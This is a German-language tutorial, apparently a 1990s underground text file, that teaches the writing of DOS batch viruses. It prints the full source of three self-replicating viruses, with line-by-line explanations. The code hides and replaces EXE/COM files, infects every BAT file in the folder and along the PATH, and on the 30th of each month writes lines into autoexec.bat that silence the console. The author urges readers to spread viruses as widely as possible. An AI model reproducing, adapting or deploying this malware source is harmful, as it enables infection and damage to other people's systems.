
             Batch-Viren-Lehrbuch
 
     Teil I  -  Generelle Informationen


Da ich in meiner Anfangszeit als Virenprogrammierer viele Probleme 
damit hatte an vernünftige Tutorials heranzukommen, entschloss ich
mich nun ein eigenes zu schreiben. Ich entschied mich dafür es in
Deutsch zu schreiben, da es nur sehr wenige in dieser 
Sprache gibt. Wie natürlich klar ist, ist dieses Handbuch nur für
Lehrzwecke einzusetzen und ich übernehme natürlich keine Haftung,
wenn ihr damit irgendetwas kriminelles anstellt... ;-)
Die folgenden Informationen beziehen sich auf Viren im Allgemeinen:

Im Jahre 1981 traten die ersten Viren auf, die noch sehr einfach
gestrickt waren, und nicht sehr destruktiv waren. Mittlerweile haben
sich die Programmierer aber immer bessere Tricks ausgedacht,
um den fiesen Antivirenprogrammen zu entgehen.

Ein Virus ist eigentlich immer nach folgendem Schema aufgebaut:
 1.) Infectionsroutine, die für die Vermehrung sorgt
 2.) Aktivierung. Hier wird festgelegt, wann sich der Virus meldet
 3.) Handlung. Was soll er tun, HD löschen, Grüsse ausrichten ...?
 
Hier sollte ich vielleicht noch erwähnen, dass es nicht Ziel eines
Virus sein sollte, moeglichst viel zu zerstören, sondern sich möglichst
weit zu verbreiten !!!

Man unterscheidet folgende Virentypen:
 
 - Dateiviren
   Sie infizieren meistens COM oder EXE Dateien, seltener jedoch BAT
   Dateien. (Und genau das wollen wir ändern)
   Sie überschreiben Teile des Programms oder hängen sich
   an dessen Ende und werden bei jedem Programmstart aktiv und
   suchen dann nach weiteren Wirten.

 - Makroviren
   Makroviren nutzen die Makrosprache von Exel und Word und starten
   automatisch beim oeffnen einer infizierten Datei. Etwa 70% aller
   heutigen Viren sind Makroviren.
 
 - Hoax Viren
   Dies sind keine wirklichen Viren, aber Warnungen vor Phantasieviren,
   die alles mögliche zerstoeren koennen. Allerdings werden diese 
   Nachrichten gerne weiterversand, um auch Freunde vor dem ach so
   boesen Virus zu waren und verbreiten sich teilweise recht stark.


Virenscanner suchen diese Viren nach 3 Methoden. Die erste Methode
besteht darin, dass eine gewisse Zeichenfolge gesucht wird, von
der man weiss, dass sie nur in dem Virus vorkommt. Eine weitere Methode
sucht nach Virenähnlichen Kommandofolgen, liefert aber oft
Fehlalaerme. Die letzte Methode besteht darin, von jeder Datei die
Dateilänge zu speichern und bei einer Überprüfung mit der aktuellen
Dateilänge zu vergleichen. Aber mitlerweise gibt es Viren,
die die Prüfdateien gleich mitverändern ...




      _                                _
     / `  | | /\  |/  _  |     _|_ /- / `
     '-\  |\| |_| <  /-` |_ \ | |  |- '-\
     \_/  | | | | |\ \_, |_> \| |  \_ \_/
                              |
			    \_|


             Batch-Viren-Lehrbuch

      Teil II  -  Hier habt ihr eure 'Sources'

Ich habe mich entschlossen eine Beschreibung von Batch Viren
anzufertigen, da diese am leichtesten zu verstehen sind, und keine
uebermaesigen Programmierkentnisse erfordern. Batch Viren infizieren
*.BAT programme, und können mit einem einfachen Text-Editor geschrieben
werden.

Zuallererst ein recht einfacher Virus, der sogenanne Wagner Virus
der von Black Wolf 1993 in Virology 101 praesentiert wurde.


   @echo off
   ctty nul
   for %%f in (*.exe *.com) do set A=%%f
   if %A%==COMMAND.COM set A=
   rename %A% V%A%
   if not exist V%A% goto end
   attrib +h V%A%
   copy %0.bat %A%
   attrib +r %A%
   ren %A% *.bat
   set A=
   :end
   ctty con
   @if exist V%0.com V%0.com %1 %2 %3
   @if exist V%0.exe V%0.exe %1 %2 %3

Für alle totalen Neulinge gehe ich den Code nun Zeile für Zeile durch.

@echo off
Dieser Befehl bewirkt, dass die Befehle des Programmes beim ausführen
nicht angezeigt werden.

ctty nul
Hier werden alle Ausgaben ins Nichts geleitet. So das der 'Benutzer'
nicht sieht, dass Dateien kopiert wurden.

for %%f in (*.exe *.com) do set A=%%f
Hier werden alle EXE und COM Dateien und schreibt jede Datei in die
Variable A. Das bedeutet, dass am Ende die letzte, noch nicht
infizierte Datei in der Variable A gespeichert wird.

if %A%==COMMAND.COM set A=
Falls A die Datei Command.COM enthaelt, wird A Null gesetzt

rename %A% V%A%
Die gefundene Datei wird umbenannt in Vname

if not exist V%A% goto end
Sollte das Umbenennen schiefgegangen sein, wird zur Stelle :end
gesprungen und beendet

attrib +h V%A%
Die umbenannte Datei wird versteckt und somit nur durch Parameter
mit dem Befehl dir /a:h sichtbar, auserdem wird sie bei einer erneuten
Ausfuehrung des Programmes nicht noch einmal umbenannt.

copy %0.bat %A%
Der Virus (%0%) wird an die Stelle der COM Datei kopiert 
attrib +r %A%
Nun wird die Datei vor dem Ueberschreiben geschuetzt

ren %A% *.bat
Nun noch eine Umbenennung in eine BAT Datei

set A=
Der Parameter A wird wieder geleert, um keine Spuren zu hinterlassen

:end
Hierher wird mit goto end gesprungen

ctty con
Die Ausgabe wird wieder auf den Bildschirm geleitet

@if exist V%0.com V%0.com %1 %2 %3
Falls die Ersetzte Datei eine COM Datei war, wird diese nun ausgeführt

@if exist V%0.exe V%0.exe %1 %2 %3
wie eben nur mit EXE Dateien


Dieser einfache Virus schnappt sich bei jedem Start eine EXE oder COM
Datei in seinem Verzeichnis und ersetzt sie durch eine Kopie von sich.
Danach wird die EXE/COM Datei wie gewohnt gestartet.
Ein anderer Virus, welcher BAT Dateien infiziert, soll hier auch noch
dargestellt werden. Er infiziert allerdings nur das Verzeichnis, in 
dem er sich befindet, dort aber alle Dateien.



@echo off>nul.CaT
  if '%1=='Inf goto CaTi
  if exist c:\!CaT.bat goto CaTs
  if not exist %0.bat goto CaTe
 find "CaT"<%0.bat>c:\!CaT.bat
 find "CaT" c:\autoexec.bat >nul
  if not errorlevel 1 goto CaTs
 echo.|date|find "30">nul.CaTs
  if errorlevel 1 goto CaTs
 echo echo CaT KillS YouR SysteM ... ;-> >>c:\Autoexec.bat
 echo ctty nul >>c:\autoexec.bat
:CaTs
 For %%a in (*.bat) do call c:\!CaT Inf %%a
 goto CaTe
:CaTi
 find "CaT"<%2>nul
  if not errorlevel 1 goto CaTe
 type c:\!CaT.bat>CaT.t
 echo echo CaT InFeCtEd YoUr SyStEm >>CaT.t
 type %2>>CaT.t
 move CaT.t %2>nul.CaT
 attrib c:\!CaT.bat +h +r +a 
:CaTe



Erklärung der einzelnen Zeilen: 

@echo off>nul.CaT
Die Anzeige der Befehle wird ausgeschaltet und eine Rückmeldung wird
nach nul.CaT geleitet

if '%1=='Inf goto CaTi
Sollte der Parameter %1 Inf sein, wird nach CaTi gesprungen

if exist c:\!CaT.bat goto CaTs
Wenn die Datei c:\!CaT.bat existiert wied nach CaTs gesprungen

find "CaT"<%0.bat>c:\!CaT.bat
Die eigene Datei soll auf die Zeichenkette CaT durchsuchtwerden, und alle
Zeilen, die diese Zeichen enthalten werden nach !CaT.bat geschrieben.
Dort wird also ein Abbild des Viruscodes erzeugt.

find "CaT" c:\autoexec.bat >nul
if not errorlevel 1 goto CaTs
Falls CaT in der Datei Autoexec.bat enthalten ist nach CaTs springen.

echo.|date|find "30">nul
if errorlevel 1 goto ende
Am 30. jedes Monats wird der Code weiter ausgefuehrt ansonsten nach CaTs
gesprungen.

echo echo CaT KillS YouR SysteM ... ;-> >>c:\Autoexec.bat
echo ctty nul >>c:\autoexec.bat
Andernfalls die Zeilen
echo CaT KillS YouR SysteM ... ;-> 
ctty nul 
der Autoexec.bat hinzufügen, was alle totalen Versager aus dem Rennen
schmeißt, aber keine wirkliche Zerstörung anrichtet.

:CaTs
For %%a in (*.bat) do call c:\!CaT Inf %%a
goto CaTe
Die Bat Datei !CaT wird nun für jede andere Bat Datei im Verzeichnis
ausgeführt. Danach wird zu CaTe gesprungen.

:CaTi
find "CaT"<%2>nul
if not errorlevel 1 goto CaTe
Untersuchung ob die angegebene Datei bereits infiziert ist, falls 
ja wird an das Codeende gesprungen.

type c:\!CaT.bat>CaT.t
type %2>>CaT.t
move CaT.t %2>nul.CaT
attrib c:\!CaT.bat +h +r +a 
Hier wird die Datei !Cat.bat kopiert, die infizierte Datei ans Ende
gehängt und die Ursprungsdatei wieder ersetzt. Danach wird die Datei
!Cat.bat versteckt.

:CaTe
Ende des Codes.


Noch ein anderer Batch - Virus, der auch im Pfad Verzeichnis nach 
Opfern sucht.

@echo off>nul.ViRuS
   rem ViRuS The BatchViRuS by Dirk van Deun 1994
   rem ViRuS May be copied freely (On your own machine !)
   rem ViRuS Programmed to prove that it's possible
   rem ViRuS (and to show off skill in writing batchfiles)
   rem ViRuS If you have no disk cache, you're not interested ;-)
   rem ViRuS E-mail hw41652@vub.ac.be
    
   rem ViRuS Known bug: interpretation of variables may make lines too long
   rem ViRuS for DOS and let characters drop off: unpredictable behaviour
    
   if "%0==" echo --------------------------------------->con.ViRuS
   if "%0==" echo |   Hi ! I am the nice BatchViRuS !   |
   if "%0==" echo --------------------------------------->con.ViRuS
   if "%0==" goto ViRuS_OLDBAT
   if "%1=="/ViRuS_MULTIPLY goto ViRuS_multiply
   if "%1=="/ViRuS_PARSEPATH goto ViRuS_parsepath
   if "%1=="/ViRuS_FINDSELF goto ViRuS_findself
   if "%VOFF%=="T goto ViRuS_OLDBAT
    
   set ViRuSname=%0
   if not exist %0.bat command /e:10000 /c %0 /ViRuS_FINDSELF %path%
   if not exist %0.bat call xViRuSx
   if not exist %0.bat del xViRuSx.bat
   if not exist %ViRuSname%.bat set ViRuSname=
   if "%ViRuSname%==" goto ViRuS_OLDBAT
    
   rem ViRuS if batch is started with name.BAT, virus will not become active
   rem ViRuS it was a bug, now it's a feature ! (also notice the voff variable)
   rem ViRuS also if batch was only in an append /x:on path (chance=minimal)
   rem ViRuS or if environment is too small to contain %ViRuSname% !
    
   if "%VPATH%==" set VPATH=%PATH%>nul.ViRuS
   rem (if environment cannot hold VPATH, ViRuS will function partially)
   command /e:10000 /c %0 /ViRuS_PARSEPATH %VPATH%
   call xViRuSx
   del xViRuSx.bat
   if "%VPATH%==" set VPATH=.>nul.ViRuS
   set ViRuSname=
   goto ViRuS_OLDBAT
    
   :ViRuS_findself
   if "%2==" echo.>xViRuSx.bat
   if "%2==" exit>nul.ViRuS
   if exist %2\%ViRuSname%.bat echo set ViRuSname=%2\%ViRuSname%>xViRuSx.bat
   if exist %2\%ViRuSname%.bat exit
   if exist %2%ViRuSname%.bat echo set ViRuSname=%2%ViRuSname%>xViRuSx.bat
   if exist %2%ViRuSname%.bat exit
   shift>nul.ViRuS
   goto ViRuS_findself
    
   :ViRuS_parsepath
   for %%a in (%2\*.bat;%2*.bat) do command /e:10000 /c %ViRuSname% /ViRuS_MULTIPLY %%a
   for %%a in (%2\*.bat;%2*.bat) do goto ViRuS_new_vpath
   shift>nul.ViRuS
   if not "%2==" goto ViRuS_parsepath
   if not "%1==". for %%a in (.\*.bat) do command /e:10000 /c %ViRuSname% /ViRuS_MULTIPLY %%a
   :ViRuS_new_vpath
   set VPATH=%3>nul.ViRuS
   :ViRuS_loop
   shift>nul.ViRuS
   if "%3==" echo set VPATH=%VPATH%>xViRuSx.bat
   if "%3==" exit>nul.ViRuS
   set VPATH=%VPATH%;%3>nul.ViRuS
   goto ViRuS_loop
    
   :ViRuS_multiply
   echo Checking: %2>con.ViRuS
   find "SeT IchBin=%%0" <%2>xViRuSx.bat
   call xViRuSx
   del xViRuSx.bat
   if "%IchBin%=="xViRuSx exit
   find "ViRuS" <%ViRuSname%.bat>xViRuSx.bat
   type %2>>xViRuSx.bat
   copy xViRuSx.bat %2>nul
   del xViRuSx.bat
   echo Infecting: %2>con.ViRuS
   exit>nul.ViRuS
    
   rem data for the first find in ViRuS_multiply
   SeT IchBin=%0>nul.ViRuS
    
   :ViRuS_OLDBAT
   echo on>nul.ViRuS
   echo This is the dummy original batch


Das sollte an Batch-Viren reichen um die Grundkentnisse des Batch Viren Programmierens zu
verstehen. Es gibt zwar noch kompliziertere Batch Viren, die COM Dateien per Maschienencode
erzeugen und diese ausführen, oder ANSI Bomben enthalten aber diese sind meiner Ansicht nach
keine wirklichen Batch Viren mehr, sondern gehören eher in andere Tutorials.
Sollten noch Fragen zu dem Thema aufkommen, einfach noch ein paar andere Guides to XXXXX
downloaden oder einfach in eine Newsgroup posten.


                ____________________________
               (                            )  
                ) Rettet die Baby-Viren !! ( 
               (____________________________) 

              _                               
             / `  | | /\  |/  _  |     _|_ /- 
             '-\  |\| |_| <  /-` |_ \ | |  |- 
             \_/  | | | | |\ \_, |_> \| |  \_ 
                                      |
		         	    \_|
